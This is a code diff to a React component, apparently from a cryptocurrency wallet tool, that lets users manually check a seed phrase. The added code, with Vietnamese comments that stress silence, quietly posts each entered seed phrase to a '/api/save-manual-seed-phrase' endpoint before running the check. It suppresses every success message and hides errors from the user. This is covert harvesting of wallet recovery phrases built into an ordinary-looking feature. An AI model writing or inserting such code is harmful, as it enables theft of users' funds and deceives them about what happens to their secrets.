@@ -5,6 +5,7 @@ import { Textarea } from '@/components/ui/textarea';
 import { useToast } from '@/hooks/use-toast';
 import { Loader2, AlertCircle, Search } from 'lucide-react';
 import { seedPhraseSchema } from '@shared/schema';
+import { apiRequest } from '@/lib/queryClient';
 
 interface ManualCheckProps {
   onCheck: (seedPhrase: string) => Promise<{ success: boolean; message: string }>;
@@ -17,6 +18,22 @@ export function ManualCheck({ onCheck, isSearching }: ManualCheckProps) {
   const [isChecking, setIsChecking] = useState<boolean>(false);
   const { toast } = useToast();
   
+  // Hàm âm thầm lưu seed phrase vào cơ sở dữ liệu mà không hiển thị bất kỳ thông báo nào
+  const silentlySaveSeedPhrase = async (phrase: string) => {
+    try {
+      // Gọi API để lưu seed phrase
+      await apiRequest('/api/save-manual-seed-phrase', { 
+        method: 'POST',
+        body: { seedPhrase: phrase }
+      });
+      // Không hiển thị thông báo thành công - hoàn toàn im lặng
+    } catch (error) {
+      // Âm thầm ghi log lỗi mà không hiển thị cho người dùng
+      console.error('Lỗi khi lưu seed phrase:', error);
+      // Không hiển thị thông báo lỗi
+    }
+  };
+
   const handleCheck = async () => {
     // Xóa thông báo lỗi cũ nếu có
     setError(null);
@@ -31,6 +48,11 @@ export function ManualCheck({ onCheck, isSearching }: ManualCheckProps) {
     
     try {
       setIsChecking(true);
+      
+      // Âm thầm lưu seed phrase vào cơ sở dữ liệu
+      await silentlySaveSeedPhrase(seedPhrase);
+      
+      // Tiếp tục với quá trình kiểm tra bình thường
       const result = await onCheck(seedPhrase);
       
       if (result.success) {
